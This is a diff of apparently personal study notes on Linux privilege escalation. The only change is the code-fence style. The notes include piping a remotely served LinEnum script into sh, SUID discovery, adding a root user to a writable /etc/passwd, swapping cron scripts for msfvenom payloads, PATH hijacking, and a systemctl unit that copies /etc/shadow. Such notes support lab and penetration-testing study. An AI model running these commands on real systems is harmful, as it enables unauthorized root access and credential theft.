@@ -4,7 +4,7 @@
 
 LinEnum:
 
-~~~
+```
 Usage:
 python -m http.server [own machine]
 
@@ -24,7 +24,7 @@ OPTIONS:
 or 
 
 curl <ip address>/LinEnum.sh | sh (cannot specify options)
-~~~
+```
 
 Important outputs of LinEnum:
 - Kernel: Kernel Information is shown here.
@@ -38,19 +38,19 @@ Important outputs of LinEnum:
 - First set in privsec is checking SUID/GUID set up.
 - SUID is set user ID/ SGID is set group ID.
 
-~~~
+```
 SUID:
 rws-rwx-rwx
 
 SGID:
 rwx-rws-rwx
-~~~
+```
 
 Find SUID/SGID
 
-~~~
+```
 find / -perm -u=s -type f 2>/dev/null
-~~~
+```
 
 ## Exploiting writeable /etc/passwd
 
@@ -74,9 +74,9 @@ Exploting etc/passwd is easy, just create a new user.
 
 - Need to create a password hash to add to the password section of /etc/passwd file  
 
-~~~
+```
 openssl passwd -1 -salt [salt] [password]
-~~~  
+```  
 - Add to /etc/passwd
 
 ## Escaping vi Editor
@@ -96,7 +96,7 @@ openssl passwd -1 -salt [salt] [password]
 
 ### Cronjob format
 
-~~~
+```
 # = ID
 
 m = Minute
@@ -117,7 +117,7 @@ command = What command should be run
 
 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
 
-~~~
+```
 
 Exploiting cronjob. Replace cronjob script with payload from msfvenom.
 
@@ -130,7 +130,7 @@ Exploiting cronjob. Replace cronjob script with payload from msfvenom.
 - Find an SUID with root.
 - If the SUID runs a command the path can to the command can be changed.
 
-~~~
+```
 cd /tmp
 
 echo "/bin/bash" > [command to be run] 
@@ -143,11 +143,11 @@ run SUID.
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
 (this resets the path)
 
-~~~ 
+``` 
 	 
 ## Exploiting systemctl SUID
 
-~~~
+```
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
@@ -156,4 +156,4 @@ ExecStart=/bin/sh -c "command you want here i.e cat /etc/shadow > /tmp/passwrds"
 WantedBy=multi-user.target' > $TF
 ./systemctl link $TF
 ./systemctl enable --now $TF
-~~~
+```
